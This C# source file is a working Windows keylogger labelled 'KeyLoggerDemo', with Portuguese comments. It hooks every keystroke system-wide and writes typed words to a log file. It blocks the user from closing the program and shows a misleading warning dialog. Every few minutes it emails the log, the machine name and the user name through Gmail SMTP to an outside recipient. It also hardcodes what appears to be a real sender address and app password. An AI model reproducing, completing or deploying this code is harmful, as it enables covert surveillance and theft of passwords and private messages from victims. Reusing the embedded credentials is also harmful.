using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Xml.Serialization; // Add this!

namespace KeyLoggerDemo
{
    public class Program : Form
    {
        private static string logFilePath = "keylog.txt";
        private static System.Windows.Forms.Timer emailTimer;
        private static Configuration config; // Use a configuration object
        private static string currentWord = ""; // Variável para armazenar a palavra atual

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int VK_BACK = 0x08; // Tecla Backspace
        private const int VK_SPACE = 0x20; // Tecla Espaço
        private const int VK_ENTER = 0x0D; // Tecla Enter
        private const int VK_COMMA = 0xBC; // Tecla Vírgula (,)
        private const int VK_PLUS = 0xBB; // Tecla Mais (+)
        private const int VK_SEMICOLON = 0xBA; // Tecla Ponto e Vírgula (;)
        private const int VK_PERIOD = 0xBE; // Tecla Ponto Final (.)
        private const int VK_AT = 0x32; // Tecla @ (Shift + 2 no layout US)

        public Program()
        {
            this.FormClosing += new FormClosingEventHandler(OnFormClosing);
            ShowWarning();
            LoadConfiguration(); // Load the configuration
            SetupEmailTimer();
        }

        public static void Main()
        {
            _hookID = SetHook(_proc);
            Application.Run(new Program());
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (System.Diagnostics.Process curProcess = System.Diagnostics.Process.GetCurrentProcess())
            using (System.Diagnostics.ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                HandleKey(vkCode);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static void HandleKey(int key)
        {
            if (key == VK_ENTER)
            {
                LogWord(currentWord); // Registra a palavra atual ao pressionar Enter
                currentWord = ""; // Reseta a palavra atual
            }
            else if (key == VK_BACK)
            {
                if (currentWord.Length > 0)
                    currentWord = currentWord.Substring(0, currentWord.Length - 1); // Remove o último caractere
            }
            else if (key == VK_SPACE)
            {
                if (!string.IsNullOrEmpty(currentWord))
                {
                    LogWord(currentWord); // Registra a palavra atual ao pressionar Espaço
                    currentWord = ""; // Reseta a palavra atual
                }
            }
            else if (key == VK_COMMA) // Tecla Vírgula (,)
            {
                currentWord += ","; // Adiciona a vírgula à palavra atual
            }
            else if (key == VK_PLUS) // Tecla Mais (+)
            {
                currentWord += "+"; // Adiciona o sinal de mais à palavra atual
            }
            else if (key == VK_SEMICOLON) // Tecla Ponto e Vírgula (;)
            {
                currentWord += ";"; // Adiciona o ponto e vírgula à palavra atual
            }
            else if (key == VK_PERIOD) // Tecla Ponto Final (.)
            {
                currentWord += "."; // Adiciona o ponto final à palavra atual
            }
            else if (key == VK_AT) // Tecla @ (Shift + 2 no layout US)
            {
                currentWord += "@"; // Adiciona o símbolo @ à palavra atual
            }
            else if ((key >= 0x41 && key <= 0x5A) || (key >= 0x30 && key <= 0x39)) // Letras A-Z e números 0-9
            {
                currentWord += (char)key; // Adiciona a letra ou número à palavra atual
            }
        }

        private static void LogWord(string word)
        {
            if (!string.IsNullOrEmpty(word))
            {
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                string logEntry = timestamp + " - " + word + Environment.NewLine; // Usando concatenação

                using (StreamWriter writer = new StreamWriter(logFilePath, true))
                {
                    writer.Write(logEntry); // Escrever entrada formatada
                }
            }
        }

        private void OnFormClosing(object sender, FormClosingEventArgs e)
        {
            // Verifica se a razão do fechamento é desligamento do sistema
            if (e.CloseReason == CloseReason.WindowsShutDown)
            {
                // Permite o fechamento do aplicativo
            }
            else
            {
                e.Cancel = true; // Impede o fechamento em outros casos
            }
        }

        private void ShowWarning()
        {
            MessageBox.Show("This program has been made for help purposes, if you close it will make a dangerous mistake, stay warned, do it at your own risk.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }

        private void SetupEmailTimer()
        {
            emailTimer = new System.Windows.Forms.Timer(); // Usando System.Windows.Forms.Timer
            emailTimer.Interval = config.EmailIntervalMinutes * 60000; // Use config value
            emailTimer.Tick += SendLogByEmail; // Usando Tick em vez de Elapsed
            emailTimer.Start();
        }

        private void LoadConfiguration()
        {
            // Create a default config if the file doesn't exist
            if (!File.Exists("config.xml"))
            {
                config = new Configuration()
                {
                    UserEmail = "macksoupletter@gmail.com", // Replace with your email
                    EmailPassword = "nofe ettp hxvf mqqp",   // Replace with your password
                    SmtpServer = "smtp.gmail.com",
                    SmtpPort = 587,
                    EmailIntervalMinutes = 5,
                    RecipientEmail = "rootkitequality@yopmail.com" // Replace with the intended recipient's email.
                };
                SaveConfiguration();
            }
            else
            {
                // Load the configuration from the file
                try
                {
                    XmlSerializer serializer = new XmlSerializer(typeof(Configuration));
                    using (FileStream fs = new FileStream("config.xml", FileMode.Open))
                    {
                        config = (Configuration)serializer.Deserialize(fs);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error loading configuration: " + ex.Message);
                    // Handle the error appropriately (e.g., use default config, display an error)
                    config = new Configuration()
                    {
                        UserEmail = "your_email@gmail.com", // Replace with your email
                        EmailPassword = "your_password",   // Replace with your password
                        SmtpServer = "smtp.gmail.com",
                        SmtpPort = 587,
                        EmailIntervalMinutes = 5,
                        RecipientEmail = "recipient@example.com" // Replace with the intended recipient's email.
                    };
                }
            }
        }

        private void SaveConfiguration()
        {
            try
            {
                XmlSerializer serializer = new XmlSerializer(typeof(Configuration));
                using (FileStream fs = new FileStream("config.xml", FileMode.Create))
                {
                    serializer.Serialize(fs, config);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error saving configuration: " + ex.Message);
            }
        }

        private void SendLogByEmail(object sender, EventArgs e)
        {
            try
            {
                string machineName = Environment.MachineName;
                string userName = Environment.UserName;
                string emailBody = "Aqui está o log das teclas.\n\n" +
                                   "Nome da Máquina: " + machineName + "\n" +
                                   "Nome do Usuário: " + userName;

                MailMessage mail = new MailMessage();
                mail.From = new MailAddress(config.UserEmail); // Use the config values
                mail.To.Add(config.RecipientEmail); // Use the config values
                mail.Subject = "Peguei um Safadinho rsrsrs";
                mail.Body = emailBody;

                Attachment attachment = new Attachment(logFilePath);
                mail.Attachments.Add(attachment);

                SmtpClient smtpClient = new SmtpClient(config.SmtpServer, config.SmtpPort);
                smtpClient.Credentials = new NetworkCredential(config.UserEmail, config.EmailPassword);
                smtpClient.EnableSsl = true; // Habilite SSL

                smtpClient.Send(mail);
                attachment.Dispose();
            }
            catch (Exception ex)
            {
                // Agora a variável ex é utilizada para logar a exceção
                Console.WriteLine("Erro ao enviar email: " + ex.Message);
            }
        }
    }

    // Create a class to hold the configuration settings
    [Serializable] // Add this attribute
    public class Configuration
    {
        public string UserEmail { get; set; }
        public string EmailPassword { get; set; }
        public string SmtpServer { get; set; }
        public int SmtpPort { get; set; }
        public int EmailIntervalMinutes { get; set; } // Add the timer interval.
        public string RecipientEmail { get; set; }
    }
}
